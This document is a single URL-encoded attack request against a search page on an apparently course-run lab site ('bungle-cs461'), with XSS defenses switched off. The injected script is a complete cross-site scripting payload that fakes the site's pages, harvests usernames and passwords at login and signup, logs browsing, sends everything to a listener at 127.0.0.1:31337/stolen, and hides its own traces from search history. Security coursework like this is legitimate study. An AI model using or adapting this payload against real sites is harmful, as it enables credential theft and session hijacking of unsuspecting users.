http://bungle-cs461.csl.illinois.edu/./search?xssdefense=0&amp;q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20var%20titleCur%20%3D%20%22%22%3B%0A%20%20%20%20var%20hrefCur%20%3D%20%22.%2F%22%3B%0A%20%20%20%20var%20userCur%20%3D%20null%3B%0A%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20pushState()%20%7B%0A%20%20%20%20%20%20%20%20window.history.pushState(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%22html%22%3A%20%24(%22body%22).html()%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22title%22%3A%20titleCur%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22href%22%3A%20hrefCur%2C%0A%20%20%20%20%20%20%20%20%7D%2C%20titleCur%2C%20hrefCur)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20fakePage()%20%7B%0A%20%20%20%20%20%20%20%20var%20loginBtn%20%3D%20%24(%22%23log-in-btn%22)%3B%0A%20%20%20%20%20%20%20%20var%20logoutBtn%20%3D%20%24(%22%23log-out-btn%22)%0A%20%20%20%20%20%20%20%20var%20signupBtn%20%3D%20%24(%22%23new-account-btn%22)%3B%0A%20%20%20%20%20%20%20%20var%20searchBtn%20%3D%20%24(%22%23search-btn%22)%3B%0A%20%20%20%20%20%20%20%20var%20searchAgainBtn%20%3D%20%24(%22%23search-again-btn%22)%3B%0A%20%20%20%20%20%20%20%20var%20bungleBtn%20%3D%20%24(%22%23bungle-lnk%22)%3B%0A%0A%20%20%20%20%20%20%20%20var%20usernameSlot%20%3D%20%24(%22%23username%22)%5B0%5D%3B%0A%20%20%20%20%20%20%20%20var%20passwordSlot%20%3D%20%24(%22%23userpass%22)%5B0%5D%3B%0A%20%20%20%20%20%20%20%20var%20querySlot%20%3D%20%24(%22%23query%22)%5B0%5D%3B%0A%0A%20%20%20%20%20%20%20%20var%20history%20%3D%20%24(%22.history-item%22)%3B%0A%0A%20%20%20%20%20%20%20%20%2F*%20login%20*%2F%0A%20%20%20%20%20%20%20%20if%20(loginBtn)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22.form-inline%22).attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20loginBtn.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(usernameSlot.value%20%26%26%20passwordSlot.value)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%22.%2Flogin%22%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20username%3A%20usernameSlot.value%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20passwordSlot.value%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20userCur%20%3D%20usernameSlot.value%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22login%22%2C%20user%3A%20userCur%2C%20pass%3A%20passwordSlot.value%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.fail(function(jqXHR%2C%20textStatus%2C%20error)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(jqXHR.responseText%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20textStatus%20%2B%20%22%3A%20%22%20%2B%20jqXHR.status%20%2B%20%22%20%22%20%2B%20error%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22.%2Flogin%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F*%20logout%20*%2F%0A%20%20%20%20%20%20%20%20if%20(logoutBtn)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20logoutBtn.attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20logoutBtn.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%22.%2Flogout%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22logout%22%2C%20user%3A%20userCur%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20userCur%20%3D%20null%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.fail(function(jqXHR%2C%20textStatus%2C%20error)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(jqXHR.responseText%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20textStatus%20%2B%20%22%3A%20%22%20%2B%20jqXHR.status%20%2B%20%22%20%22%20%2B%20error%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22.%2Flogout%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F*%20create%20account%20*%2F%0A%20%20%20%20%20%20%20%20if%20(signupBtn)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22.form-inline%22).attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20signupBtn.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(usernameSlot.value%20%26%26%20passwordSlot.value)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%22.%2Fcreate%22%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20username%3A%20usernameSlot.value%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20passwordSlot.value%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20userCur%20%3D%20usernameSlot.value%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22login%22%2C%20user%3A%20userCur%2C%20pass%3A%20passwordSlot.value%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.fail(function%20(jqXHR%2C%20textStatus%2C%20error)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(jqXHR.responseText%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20textStatus%20%2B%20%22%3A%20%22%20%2B%20jqXHR.status%20%2B%20%22%20%22%20%2B%20error%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22.%2Fcreate%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F*%20search%20*%2F%0A%20%20%20%20%20%20%20%20if%20(searchBtn)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20searchBtn.attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20searchBtn.click(function%20()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.get(%22.%2Fsearch%22%2C%20%7Bq%3A%20querySlot.value%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Search%20Results%22%2C%20%22.%2Fsearch%3Fq%3D%22%20%2B%20querySlot.value)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F*%20search%20again%20*%2F%0A%20%20%20%20%20%20%20%20if%20(searchAgainBtn)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20searchAgainBtn.removeAttr(%22href%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20searchAgainBtn.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.get(%22.%2F%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F*%20search%20history%20*%2F%0A%20%20%20%20%20%20%20%20history.removeAttr(%22href%22)%3B%0A%20%20%20%20%20%20%20%20history.css(%22cursor%22%2C%20%22pointer%22)%3B%0A%20%20%20%20%20%20%20%20%24.each(history%2C%20function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(this.text.indexOf(%22function%20payload(attacker)%22)%20!%3D%3D%20-1%20%7C%7C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20this.text.indexOf(%22eval(String.fromCharCode(%22)%20!%3D%3D%20-1)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20this.remove()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(this).click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20lk%20%3D%20%22.%2Fsearch%3Fq%3D%22%20%2B%20this.text%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.get(lk)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Search%20Results%22%2C%20lk)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%2F*%20bungle%20*%2F%0A%20%20%20%20%20%20%20%20if%20(bungleBtn)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20bungleBtn.removeAttr(%22href%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20bungleBtn.css(%22cursor%22%2C%20%22pointer%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20bungleBtn.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.get(%22.%2F%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.done(function(data)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pushState()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20proxy(html%2C%20title%2C%20href)%20%7B%0A%20%20%20%20%20%20%20%20%24(%22body%22).html(html)%3B%0A%20%20%20%20%20%20%20%20titleCur%20%3D%20title%3B%0A%20%20%20%20%20%20%20%20hrefCur%20%3D%20href%3B%0A%0A%20%20%20%20%20%20%20%20window.history.replaceState(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%22html%22%3A%20%24(%22body%22).html()%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22title%22%3A%20titleCur%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22href%22%3A%20hrefCur%2C%0A%20%20%20%20%20%20%20%20%7D%2C%20titleCur%2C%20hrefCur)%3B%0A%20%20%20%20%20%20%20%20%24(%22title%22)%5B0%5D.text%20%3D%20titleCur%3B%0A%0A%20%20%20%20%20%20%20%20if%20(userCur%20%3D%3D%20null)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20url%3A%20window.location.href%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20userCur%2C%20url%3A%20window.location.href%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20fakePage()%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24(%22body%22).load(%22.%2F%22%2C%20function()%20%7B%0A%20%20%20%20%20%20%20%20window.onpopstate%20%3D%20function(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(event.state%5B%22html%22%5D%2C%20event.state%5B%22title%22%5D%2C%20event.state%5B%22href%22%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20proxy(%24(%22body%22).html()%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0A%20%20%20%20%7D)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscript%3E
